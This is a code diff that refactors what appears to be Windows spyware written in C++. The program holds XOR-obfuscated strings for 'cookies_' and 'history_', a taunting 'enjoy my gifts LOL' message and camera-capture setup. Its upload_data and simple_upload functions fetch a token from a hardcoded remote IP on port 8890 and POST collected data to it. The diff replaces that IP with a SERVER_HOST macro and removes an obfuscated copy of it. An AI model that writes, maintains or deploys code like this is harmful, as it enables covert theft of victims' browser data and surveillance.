@@ -14,6 +14,7 @@
 #include <dshow.h>
 #include <gdiplus.h>
 #include <ShlObj.h>
+#include "config.h"
 
 #pragma comment(lib, "strmiids.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -51,9 +52,6 @@ static char _msg[] = {0x2C,0x3A,0x20,0x75,0x25,0x36,0x75,0x3F,0x20,0x26,0x21,0x7
 static char _enj[] = {0x30,0x3B,0x3F,0x3A,0x2C,0x75,0x38,0x2C,0x75,0x32,0x3C,0x33,0x21,0x26,0x75,0x19,0x1A,0x19}; // "enjoy my gifts LOL"
 static char _ck[] = {0x36,0x3A,0x3A,0x3E,0x3C,0x30,0x26,0x0A}; // "cookies_"
 static char _hi[] = {0x3D,0x3C,0x26,0x21,0x3A,0x27,0x2C,0x0A}; // "history_"
-static wchar_t _srv[] = L"\x64\x66\x64\x7B\x64\x61\x66\x7B\x67\x64\x60\x7B\x62\x67"; // "131.143.215.72"
-inline void XW(wchar_t* s, size_t n) { for (size_t i = 0; i < n; i++) ((char*)&s[i])[0] ^= XKEY; }
-#define XSTW(var) ([]()->const wchar_t*{ static bool f; if(!f){ XW(var, (sizeof(var)/sizeof(wchar_t))-1); f=true; } return var; }())
 
 // qedit.h was removed from Windows SDK 8+ — manual definitions
 static const CLSID CLSID_SampleGrabber =
@@ -513,7 +511,7 @@ std::string fetch_token()
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hSession) { diag_log("token: WinHttpOpen failed"); return token; }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"131.143.215.72", 8890, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8890, 0);
     if (!hConnect) { diag_log("token: WinHttpConnect failed"); WinHttpCloseHandle(hSession); return token; }
 
     HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", L"/token",
@@ -678,7 +676,7 @@ void upload_data()
             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
         if (!hSession) { diag_log("upload: WinHttpOpen fail"); Sleep(2000); continue; }
 
-        HINTERNET hConnect = WinHttpConnect(hSession, L"131.143.215.72", 8890, 0);
+        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8890, 0);
         if (!hConnect) { diag_log("upload: Connect fail"); WinHttpCloseHandle(hSession); Sleep(2000); continue; }
 
         // build URL with token as query param
@@ -1134,7 +1132,7 @@ void simple_upload()
     // fetch token via WinHTTP
     HINTERNET hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hS) return;
-    HINTERNET hC = WinHttpConnect(hS, L"131.143.215.72", 8890, 0);
+    HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 8890, 0);
     if (hC) {
         HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/token", nullptr, nullptr, nullptr, 0);
         if (hR && WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(hR, nullptr)) {
@@ -1220,7 +1218,7 @@ void simple_upload()
     std::wstring wu(url.begin(), url.end());
     hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hS) return;
-    hC = WinHttpConnect(hS, L"131.143.215.72", 8890, 0);
+    hC = WinHttpConnect(hS, SERVER_HOST, 8890, 0);
     if (hC) {
         HINTERNET hR = WinHttpOpenRequest(hC, L"POST", wu.c_str(), nullptr, nullptr, nullptr, 0);
         if (hR) {
